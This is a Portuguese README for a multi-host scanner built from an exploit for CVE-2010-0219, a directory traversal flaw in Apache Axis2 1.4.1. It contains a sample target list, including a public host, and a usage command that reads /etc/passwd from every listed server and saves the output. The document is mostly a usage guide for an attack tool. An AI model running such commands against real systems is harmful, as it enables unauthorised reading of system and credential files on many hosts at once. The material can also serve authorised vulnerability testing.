# axis2_multi_xsd_scanner CVE-2010-0219
versão avançada do exploit para a vulnerabilidade de Directory Traversal em Apache Axis2 1.4.1 (xsd) convertida em um scanner multi-host


# Uso
python3 axis2_multi_xsd_scanner.py --help

# Criar arquivo com alvos: 
http://192.168.1.10:8080/axis2/services/Version
http://192.168.1.15:8080/axis2/services/Version
http://example.com/axis2/services/Version

# Exemplo de Scaner:
python3 axis2_multi_xsd_scanner.py -l targets.txt -f /etc/passwd -o output
